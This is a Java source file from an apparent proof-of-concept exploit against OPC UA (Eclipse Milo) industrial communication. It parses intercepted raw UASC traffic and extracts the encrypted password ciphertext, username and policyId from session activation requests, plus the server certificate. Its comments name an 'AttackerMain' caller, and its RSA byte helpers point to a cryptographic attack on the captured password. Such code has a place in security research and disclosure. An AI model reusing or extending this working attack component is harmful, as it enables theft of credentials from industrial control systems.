package poc.common;

import io.netty.buffer.Unpooled;
import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.cert.X509Certificate;
import java.util.function.Consumer;
import org.eclipse.milo.opcua.stack.core.encoding.DefaultEncodingContext;
import org.eclipse.milo.opcua.stack.core.encoding.EncodingContext;
import org.eclipse.milo.opcua.stack.core.encoding.binary.OpcUaBinaryDecoder;
import org.eclipse.milo.opcua.stack.core.types.builtin.ExtensionObject;
import org.eclipse.milo.opcua.stack.core.types.structured.ActivateSessionRequest;
import org.eclipse.milo.opcua.stack.core.types.structured.CreateSessionResponse;
import org.eclipse.milo.opcua.stack.core.types.structured.UserNameIdentityToken;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/** Byte/hex/hash helpers plus the raw UASC-frame scanner used to extract a captured ciphertext. */
public final class WireCodec {

  private static final Logger LOGGER = LoggerFactory.getLogger(WireCodec.class);

  private WireCodec() {}

  public static BigInteger os2ip(byte[] bytes) {
    return new BigInteger(1, bytes);
  }

  public static byte[] i2osp(BigInteger value, int length) {
    byte[] raw = value.toByteArray();
    byte[] result = new byte[length];
    if (raw.length == length) {
      return raw;
    } else if (raw.length > length) {
      System.arraycopy(raw, raw.length - length, result, 0, length);
    } else {
      System.arraycopy(raw, 0, result, length - raw.length, raw.length);
    }
    return result;
  }

  public static String toHex(byte[] data) {
    StringBuilder sb = new StringBuilder(data.length * 2);
    for (byte b : data) {
      sb.append(String.format("%02x", b));
    }
    return sb.toString();
  }

  public static byte[] fromHex(String hex) {
    int len = hex.length();
    byte[] out = new byte[len / 2];
    for (int i = 0; i < out.length; i++) {
      out[i] =
          (byte)
              ((Character.digit(hex.charAt(2 * i), 16) << 4)
                  + Character.digit(hex.charAt(2 * i + 1), 16));
    }
    return out;
  }

  public static String sha256Hex(byte[] data) {
    try {
      byte[] h = MessageDigest.getInstance("SHA-256").digest(data);
      return toHex(h);
    } catch (Exception e) {
      throw new RuntimeException(e);
    }
  }

  public static String certFingerprintSha256(X509Certificate cert) {
    try {
      return sha256Hex(cert.getEncoded());
    } catch (Exception e) {
      throw new RuntimeException("failed to compute certificate fingerprint", e);
    }
  }

  private static long readUInt32LE(byte[] b, int off) {
    return (b[off] & 0xFFL)
        | ((b[off + 1] & 0xFFL) << 8)
        | ((b[off + 2] & 0xFFL) << 16)
        | ((b[off + 3] & 0xFFL) << 24);
  }

  /**
   * Walk a recorded byte stream as raw UASC messages ({@code type[3] chunkType[1] size[4LE]
   * ...}), invoking {@code bodyConsumer} with the decoded message body (header stripped: 24
   * bytes = SecureMessageHeader 12 + SymmetricSecurityHeader 4 + SequenceHeader 8) of every
   * {@code MSG} chunk. This is the ONLY thing that understands the UASC framing; everything else
   * in this class works on the plain OPC UA message objects it hands back.
   */
  private static void forEachMsgBody(byte[] stream, Consumer<byte[]> bodyConsumer) {
    int off = 0;
    while (off + 8 <= stream.length) {
      String type = new String(stream, off, 3, StandardCharsets.US_ASCII);
      long size = readUInt32LE(stream, off + 4);
      if (size < 8 || off + size > stream.length) {
        break;
      }
      if ("MSG".equals(type)) {
        int bodyStart = off + 24;
        int bodyLen = (int) size - 24;
        if (bodyLen > 0 && bodyStart + bodyLen <= stream.length) {
          byte[] body = new byte[bodyLen];
          System.arraycopy(stream, bodyStart, body, 0, bodyLen);
          bodyConsumer.accept(body);
        }
      }
      off += (int) size;
    }
  }

  /**
   * Parses a RAW recorded client-&gt;server byte stream (as captured, unmodified, by a passive
   * TCP relay) looking for an {@link ActivateSessionRequest} carrying a {@link
   * UserNameIdentityToken} whose password field is exactly {@code blockSize} bytes. Returns that
   * ciphertext plus the plaintext username and policyId it was submitted under -- all of which
   * are observable on the wire in the clear; only the password field itself is encrypted. This
   * is the same parsing an attacker who intercepted the raw bytes would have to do themselves;
   * callers are expected to be {@code poc.AttackerMain} doing exactly that, not a helper process
   * handing over a pre-extracted result.
   */
  public static ExtractedToken extractPasswordCiphertextFromStream(byte[] stream, int blockSize) {
    EncodingContext ctx = DefaultEncodingContext.INSTANCE;
    ExtractedToken[] found = new ExtractedToken[1];
    forEachMsgBody(
        stream,
        body -> {
          if (found[0] != null) return;
          try {
            OpcUaBinaryDecoder dec = new OpcUaBinaryDecoder(ctx);
            dec.setBuffer(Unpooled.wrappedBuffer(body));
            Object msg = dec.decodeMessage("");
            if (msg instanceof ActivateSessionRequest asr) {
              ExtensionObject xo = asr.getUserIdentityToken();
              if (xo != null) {
                Object tok = xo.decode(ctx);
                if (tok instanceof UserNameIdentityToken unit) {
                  byte[] pw = unit.getPassword().bytesOrEmpty();
                  if (pw.length == blockSize) {
                    LOGGER.info(
                        "  decoded ActivateSessionRequest on wire: policyId={}, user={}, encAlg={},"
                            + " password ct = {} bytes",
                        unit.getPolicyId(),
                        unit.getUserName(),
                        unit.getEncryptionAlgorithm(),
                        pw.length);
                    found[0] = new ExtractedToken(unit.getUserName(), unit.getPolicyId(), pw);
                  }
                }
              }
            }
          } catch (Exception ex) {
            // not this chunk; keep scanning
          }
        });
    return found[0];
  }

  /**
   * Parses a RAW recorded server-&gt;client byte stream looking for a {@link
   * CreateSessionResponse} carrying the server's certificate, returning the raw DER bytes. This
   * is public, unauthenticated information any observer on the wire sees during ordinary session
   * establishment -- it requires no secret and no special access to extract.
   */
  public static byte[] extractServerCertificateFromStream(byte[] stream) {
    EncodingContext ctx = DefaultEncodingContext.INSTANCE;
    byte[][] found = new byte[1][];
    forEachMsgBody(
        stream,
        body -> {
          if (found[0] != null) return;
          try {
            OpcUaBinaryDecoder dec = new OpcUaBinaryDecoder(ctx);
            dec.setBuffer(Unpooled.wrappedBuffer(body));
            Object msg = dec.decodeMessage("");
            if (msg instanceof CreateSessionResponse csr) {
              byte[] cert = csr.getServerCertificate().bytesOrEmpty();
              if (cert.length > 0) {
                found[0] = cert;
              }
            }
          } catch (Exception ex) {
            // not this chunk; keep scanning
          }
        });
    return found[0];
  }

  public static final class ExtractedToken {
    public final String username;
    public final String policyId;
    public final byte[] ciphertext;

    ExtractedToken(String username, String policyId, byte[] ciphertext) {
      this.username = username;
      this.policyId = policyId;
      this.ciphertext = ciphertext;
    }
  }
}
